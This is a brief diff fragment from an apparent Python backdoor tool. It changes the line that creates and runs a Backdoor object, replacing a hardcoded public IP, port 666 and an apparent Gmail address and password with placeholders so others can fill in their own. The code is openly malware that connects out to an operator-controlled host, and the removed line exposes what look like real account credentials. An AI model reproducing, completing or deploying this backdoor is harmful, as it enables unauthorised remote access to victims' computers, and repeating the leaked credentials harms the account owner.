@@ -180,6 +180,6 @@ class Backdoor:
 _thread.start_new_thread(s, ("waiting", 50))
 time.sleep(100)
 '''
-my_backdoor = Backdoor("118.200.124.57", 666, "nicenoob247@gmail.com", "nicenoob1234",
+my_backdoor = Backdoor("Your Public IP", Port Number, "Your Gmail", "Gmail Password",
                        socket.socket(socket.AF_INET, socket.SOCK_STREAM))
 my_backdoor.run()
